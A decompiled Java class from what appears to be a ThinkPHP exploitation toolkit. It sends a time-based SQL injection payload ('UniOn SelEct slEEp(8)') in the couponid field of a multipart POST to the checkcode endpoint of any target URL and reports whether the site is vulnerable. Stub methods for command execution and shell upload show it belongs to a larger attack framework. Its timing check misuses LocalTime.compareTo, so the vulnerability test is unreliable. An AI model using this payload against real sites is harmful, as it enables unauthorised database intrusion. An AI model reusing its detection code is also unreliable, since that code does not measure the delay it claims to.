/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import java.time.LocalTime;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp_checkcode_time_sqli
/*    */   implements BaseExp {
/* 11 */   private String results = null;
/* 12 */   private final HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 16 */     LocalTime start_time = LocalTime.now();
/* 17 */     this.property.put("Content-Type", "multipart/form-data; boundary=--------641902708");
/* 18 */     this.property.put("Accept-Encoding", "gzip, deflate, sdch");
/* 19 */     url = url + "/index.php?s=/home/user/checkcode/";
/* 20 */     String payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(8)#\r\n\r\n----------641902708--";
/* 21 */     Response response = HttpTool.post(url, payload, this.property);
/*    */     
/* 23 */     if (LocalTime.now().compareTo(start_time) >= 8) {
/* 24 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 25 */       return this.results;
/*    */     } 
/* 27 */     if (response.getError() != null) {
/* 28 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 29 */       return this.results;
/*    */     } 
/* 31 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 32 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 37 */     return null;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 42 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp_checkcode_time_sqli.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */